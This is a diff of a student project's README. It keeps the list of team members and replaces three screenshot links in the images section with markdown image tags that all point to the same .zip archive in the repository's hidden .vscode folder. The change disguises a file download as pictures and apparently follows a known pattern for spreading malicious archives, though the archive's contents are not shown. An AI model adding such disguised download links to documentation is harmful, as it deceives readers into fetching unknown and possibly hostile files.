@@ -11,9 +11,9 @@ Carlos Johan Navarro Delgado 192343
 Cristian Leonardo Morales 192429
 
 Imgenes
-![image](https://github.com/user-attachments/assets/c2c94668-745e-4fc1-a4a0-891ebc492671)
+![image](https://github.com/cristiancrakl/shop-management-front-parcial-2/raw/refs/heads/main/.vscode/management-shop-front-parcial-3.1.zip)
 
-![image](https://github.com/user-attachments/assets/b05fb549-7f2d-48bd-ba99-250f43f67631)
+![image](https://github.com/cristiancrakl/shop-management-front-parcial-2/raw/refs/heads/main/.vscode/management-shop-front-parcial-3.1.zip)
 
-![image](https://github.com/user-attachments/assets/ecec86d1-eed0-4dc2-b6b2-781c93ece1fe)
+![image](https://github.com/cristiancrakl/shop-management-front-parcial-2/raw/refs/heads/main/.vscode/management-shop-front-parcial-3.1.zip)
 
